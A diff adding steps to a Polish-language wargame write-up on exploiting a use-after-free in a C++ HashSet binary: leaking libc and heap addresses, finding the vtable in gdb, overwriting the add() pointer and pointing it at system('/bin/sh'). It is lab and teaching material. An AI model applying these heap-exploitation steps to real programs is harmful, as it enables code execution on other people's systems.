@@ -349,6 +349,26 @@ How many items will you store?: 4294967295
 terminate called after throwing an instance of 'std::bad_alloc'
   what():  std::bad_alloc
 ```
+* Binarka nie sprawdza, "czytając" obiekt czy on istnieje - klasyczny UAF
+* Alokacja obiektów `HashSet` o różnych wielkościach (256, 128 i na końcu 600) pozwala na nadpisanie wskaźnika w vtable - konkretnie chodzi o wskaźnik do metody `add()`
+* Jednak w takim podejściu wymagany jest leak dwóch adresów: libc oraz heap (heap jako wskaźnik do listy przechowywanych `HashSet` - w niedalekiej odległości leży vtable, które jest do zepsucia):
+```c
+// Hashset
+template<class T, class HashFunc>
+class HashSet {
+    public:
+        HashSet(unsigned int size) : m_size(size), set_data(new T[size]) {}
+        virtual ~HashSet() { delete [] set_data; }
+        virtual void add(T val);
+        virtual unsigned int find(T val);
+        virtual T get(unsigned int);
+    private:
+        unsigned int m_size;
+        HashFunc m_hash;
+        T *set_data;
+};
+typedef HashSet<int, hash_num> hashset_int;
+```
 * Dwukrotne dodanie obiektu `HashSet` o wielkości 256 do listy, a następnie skasowanie ich i dodanie mniejszego (rozmiar 128) spowoduje "niekorzystny" układ na heapie i wyleakowanie wskaźnika w libc za pomocą którego możemy znaleźć offset do funkcji `system()`:
 ```
 +----------- clark's improved item storage -----------+
@@ -365,4 +385,27 @@ Item value: 0
 Item Found
 lockbox[0] = -1209240496
 ```
-* W podobny sposób można ustalić adres heapa - alokujemy kolejny obiekt o wielkości 600 na czwartym miejcu listy (indek 3) i czytamy z niego element o indeksie 389.
+* W podobny sposób można ustalić adres heapa - alokujemy kolejny obiekt o wielkości 600 na czwartym miejcu listy (indeks 3) i czytamy z niego element o indeksie 1 - jest to adres nowoutworzonego obiektu.
+* Warto w tym miejscu powiedzieć jak ustalić adres vtable za pomocą, dostępnego na warzone, gdb:
+   * Komenda `info variables HashSet*` pozwoli uzyskać adres początku vtable (string `vtable for HashSet<int, hash_num>`):
+```
+gdb-peda$ info variables HashSet*
+All variables matching regular expression "HashSet*":
+
+Non-debugging symbols:
+0x08049aa0  vtable for HashSet<int, hash_num>
+0x08049abc  typeinfo name for HashSet<int, hash_num>
+0x08049ad4  typeinfo for HashSet<int, hash_num>
+```
+  * Ustalić zawartość vtable można za pomocą komendy `x/20a [vtable_addr]`
+```
+gdb-peda$ x/20a 0x8049aa0
+0x8049aa0 <_ZTV7HashSetIi8hash_numE>:	0x0	0x8049ad4 <_ZTI7HashSetIi8hash_numE>	0x80496e0 <_ZN7HashSetIi8hash_numED2Ev>	0x804971e <_ZN7HashSetIi8hash_numED0Ev>
+0x8049ab0 <_ZTV7HashSetIi8hash_numE+16>:	0x8049618 <_ZN7HashSetIi8hash_numE3addEi>	0x8049660 <_ZN7HashSetIi8hash_numE4findEi>	0x8049692 <_ZN7HashSetIi8hash_numE3getEj>	0x73614837
+0x8049ac0 <_ZTS7HashSetIi8hash_numE+4>:	0x74655368	0x68386949	0x5f687361	0x456d756e
+0x8049ad0 <_ZTS7HashSetIi8hash_numE+20>:	0x0	0x804b088 <_ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3+8>	0x8049abc <_ZTS7HashSetIi8hash_numE>	0x3b031b01
+0x8049ae0:	0xb8	0x16	0xfffff2e4	0xd4
+```
+* Vtable znajduje się pod adresem: `leaked heap - 0x2588`
+* Mając adres vtable można określić wielkość potrzebnego `HashSetu` do wpisania w pamięci jego adresu.
+* Ostatnim krokiem jest wpisanie adresu `/bin/sh` w pierwszym `HashSet` 
